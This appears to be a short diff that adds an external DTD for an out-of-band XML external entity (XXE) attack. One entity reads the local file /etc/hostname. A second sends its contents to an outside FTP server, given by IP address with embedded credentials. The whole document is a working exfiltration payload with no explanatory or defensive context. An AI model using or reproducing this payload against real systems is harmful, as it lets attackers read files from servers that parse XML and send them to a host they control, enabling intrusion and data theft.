@@ -1,0 +1,2 @@
+<!ENTITY % three SYSTEM "file:///etc/hostname">
+<!ENTITY % two "<!ENTITY four SYSTEM 'ftp://unclebenz:unclebenz@54.175.159.116:2121/%three;'>">
